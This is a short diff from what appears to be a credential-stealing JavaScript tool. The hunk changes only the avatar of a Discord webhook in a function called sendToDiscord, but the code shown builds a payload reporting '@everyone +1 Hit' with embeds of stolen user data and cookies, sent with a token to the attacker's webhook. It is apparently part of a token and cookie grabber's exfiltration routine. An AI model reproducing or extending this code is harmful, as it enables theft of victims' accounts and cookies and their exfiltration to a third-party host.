@@ -2233,7 +2233,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
       const combinedPayload = {
         content: "@everyone +1 Hit",
         username: "QNC",  // Custom webhook username
-        avatar_url: "https://imgur.com/a/cddQVcR",  // Custom webhook avatar
+        avatar_url: "https://i.imgur.com/Bszz5QR.jpeg",  // Custom webhook avatar
         embeds: [userDataEmbed, cookieEmbed]
       };
 
